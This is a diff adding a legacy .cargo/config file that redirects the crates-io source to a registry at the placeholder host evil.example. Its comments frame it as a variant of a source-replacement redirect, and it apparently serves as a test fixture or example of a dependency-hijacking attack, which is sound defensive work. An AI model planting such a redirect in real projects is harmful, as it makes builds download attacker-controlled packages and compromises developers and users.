@@ -1,0 +1,7 @@
+# Legacy extensionless ./.cargo/config — cargo still honors it (config.toml
+# takes precedence when both exist). Same source-replacement redirect.
+[source.crates-io]
+replace-with = "m"
+
+[source.m]
+registry = "registry+https://evil.example/git/index"
